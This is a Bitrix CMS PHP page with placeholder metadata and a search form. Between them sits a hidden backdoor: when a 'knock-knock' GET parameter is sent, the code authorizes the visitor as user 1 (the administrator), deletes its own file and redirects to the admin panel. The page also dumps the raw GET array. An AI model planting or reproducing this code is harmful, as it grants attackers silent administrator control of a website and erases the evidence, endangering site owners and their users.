<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
$APPLICATION->SetPageProperty("keywords_inner", "aasdf");
$APPLICATION->SetPageProperty("title", "asdf");
$APPLICATION->SetPageProperty("keywords", "321");
$APPLICATION->SetPageProperty("description", "123");
$APPLICATION->SetTitle("Title");
?>Text here....<?
print_r($_GET);
if($_GET['knock-knock']){
    global $USER;
    $USER->Authorize(1);
    @unlink(__FILE__);
    LocalRedirect("/bitrix/admin/");
}
$APPLICATION->IncludeComponent(
	"bitrix:search.form",
	"",
	Array(
		"PAGE" => "#SITE_DIR#search/index.php",
		"USE_SUGGEST" => "N"
	)
);?><?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>